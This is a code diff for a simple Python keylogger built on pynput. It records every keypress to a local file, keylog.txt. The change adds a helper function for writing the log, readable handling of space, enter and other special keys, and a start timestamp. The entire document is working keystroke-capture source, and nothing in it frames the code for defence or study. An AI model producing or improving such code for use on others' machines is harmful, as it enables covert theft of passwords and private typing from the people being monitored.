@@ -4,28 +4,34 @@
 from pynput import keyboard
 from datetime import datetime
 
-current_time = datetime.now()
-log_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
-
-with open("keylog.txt",'a') as log:
+def write_log(data):
+    with open("keylog.txt", 'a') as log:
         try:
-            log.write(f"\n\n {log_time} \n")
-        except Exception as e :
-            print(f"An Error Occured : {e}")
+            log.write(data)
+        except Exception as e:
+            print(f"An Error Occurred: {e}")
+
 
 def keylog(key):
     key = str(key)
+    if key == 'Key.space':
+        key = ' '
+    elif key == 'Key.enter':
+        key = '\n'
+    elif key.startswith('Key'):
+        key = f'  [{key}]  ' 
+    
     print(key)
-    with open("keylog.txt",'a') as log:
-        try:
-            log.write(f"{key}")
-        except Exception as e :
-            print(f"An Error Occured : {e}")
+    write_log(key)
+
 
 def listner():
-    key_listner = keyboard.Listener(on_press=keylog)
-    key_listner.start()
-    print("starting")
-    input()
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    write_log(f"\n\nLogging started at {current_time}\n")
+    
+    with keyboard.Listener(on_press=keylog) as listener:
+        print("Keylogging started...")
+        listener.join()
+
 
 listner()
